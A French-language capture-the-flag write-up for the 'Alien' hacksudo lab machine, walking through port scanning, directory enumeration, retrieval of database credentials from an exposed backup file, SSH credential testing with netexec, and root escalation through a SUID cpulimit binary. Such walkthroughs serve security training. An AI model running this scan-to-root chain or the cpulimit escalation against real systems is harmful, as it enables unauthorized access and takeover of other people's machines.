# Alien
1.Énumération

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.207
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.207...100%
[+] Scan Nmap 192.168.56.207...100%
 
[+] 9000/tcp open
[+] 22/tcp open
[+] 80/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.207-tcp.html     |
==========================================================
```

&nbsp;

**<span style="color: #dddddd;">👊</span> Gobuster**

Allons voir les `dir` cacher

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $gobuster dir -u http://192.168.56.207/ -w /usr/share/wordlists/dirb/big.txt -x html,php,txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.207/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt,bak
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess.txt        (Status: 403) [Size: 279]
/.htaccess.php        (Status: 403) [Size: 279]
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd.php        (Status: 403) [Size: 279]
/.htaccess.html       (Status: 403) [Size: 279]
/.htpasswd.txt        (Status: 403) [Size: 279]
/.htaccess.bak        (Status: 403) [Size: 279]
/.htpasswd.html       (Status: 403) [Size: 279]
/.htpasswd.bak        (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/backup               (Status: 301) [Size: 317] [--> http://192.168.56.207/backup/]
/favicon.ico          (Status: 200) [Size: 17726]
/game.html            (Status: 200) [Size: 701]
/images               (Status: 301) [Size: 317] [--> http://192.168.56.207/images/]
/index.html           (Status: 200) [Size: 2225]
/server-status        (Status: 403) [Size: 279]
Progress: 102345 / 102350 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

**<span style="color: #dddddd;">🌍</span> Curl**

`Backup` a l’air intéressant allons voir ça

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $curl http://192.168.56.207/backup/mysql.bak
#!/bin/bash

# Specify which database is to be backed up
db_name=""

# Set the website which this database relates to
website="localhost"

# Database credentials
user="vishal"
password="hacksudo"
host="localhost"

# How many days would you like to keep files for?
days="30"

######################################################
##### EDITING BELOW MAY CAUSE UNEXPECTED RESULTS #####
######################################################

# Set the date
date=$(date +"%Y%m%d-%H%M")

# Set the location of where backups will be stored
backup_location="/var/backups/mysql"

# Create the directory for the website if it doesn't already exist
mkdir -p ${backup_location}/${website}
# Append the database name with the date to the backup location
backup_full_name="${backup_location}/${website}/${db_name}-${date}.sql"

# Set default file permissions
umask 177

# Dump database into SQL file
mysqldump --lock-tables --user=$user --password=$password --host=$host $db_name > $backup_full_name

# Set a value to be used to find all backups with the same name
find_backup_name="${backup_location}/${website}/${db_name}-*.sql"
# Delete files older than the number of days defined
find $find_backup_name -mtime +$days -type f -delete
```

&nbsp;

Dump des hash utilisateur de `mysql` avec les cred trouver précédemment

![dtatabase.png](../../_resources/dtatabase.png)

&nbsp;

**<span style="color: #dddddd;">🖥️</span> Netexec**

Apres avoir réussi a recuperer les hash des user de la base SQL précédemment , j’ai les ai ensuite cracker pour tester les cred en `SSH`

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $nxc ssh 192.168.56.207 -u user.txt -p password.txt --no-bruteforce
SSH         192.168.56.207  22     192.168.56.207   [*] SSH-2.0-OpenSSH_7.9p1 Debian-10+deb10u2
SSH         192.168.56.207  22     192.168.56.207   [-] phpmyadmin:root
SSH         192.168.56.207  22     192.168.56.207   [-] shovon:123
SSH         192.168.56.207  22     192.168.56.207   [+] hacksudo:aliens  Linux - Shell access!
```

&nbsp;

**<span style="color: #dddddd;">🤖</span> Linpeas**

Voyons ce qu’on trouve d’intéressant

```
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
strace Not Found
You can write SUID file: /home/hacksudo/Downloads/cpulimit


```

&nbsp;

<span style="color: #dddddd;">⚙️</span> GTFObin

Linpeas nous a indiquer précédemment qu’avec le binaire `cpuilimit` nous pouvons être `root`

![Capture du 2025-04-21 18-33-29.png](../../_resources/Capture%20du%202025-04-21%2018-33-29.png)

&nbsp;

Élévation de privilège avec le binaire `cpulimit`

```
hacksudo@hacksudo:~/Downloads$ ./cpulimit -l 100 -f -- /bin/bash -p
Process 23526 detected
bash-5.0#
```

&nbsp;

Identifiant trouver

| User | Password |
| --- | --- |
| hacksudo | aliens |

&nbsp;
